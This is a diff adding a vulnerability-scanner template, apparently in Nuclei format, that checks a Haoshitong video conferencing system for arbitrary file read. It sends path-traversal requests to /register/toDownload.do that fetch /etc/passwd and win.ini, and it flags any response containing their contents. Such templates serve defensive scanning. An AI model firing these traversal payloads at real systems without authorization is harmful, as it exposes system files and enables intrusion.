@@ -1,0 +1,23 @@
+id: hst-fileRead
+info:
+  author: str1am
+  name: "\u597D\u89C6\u901A\u89C6\u9891\u4F1A\u8BAE\u7CFB\u7EDF\u4EFB\u610F\u6587\u4EF6\
+    \u8BFB\u53D6"
+  severity: high
+  tags: hst,fileRead
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: or
+    part: body
+    type: word
+    words:
+    - root:x
+    - '[extensions]'
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini'
+  - '{{BaseURL}}/register/toDownload.do?fileName=../../../../../../../../../../../../../../etc/passwd'
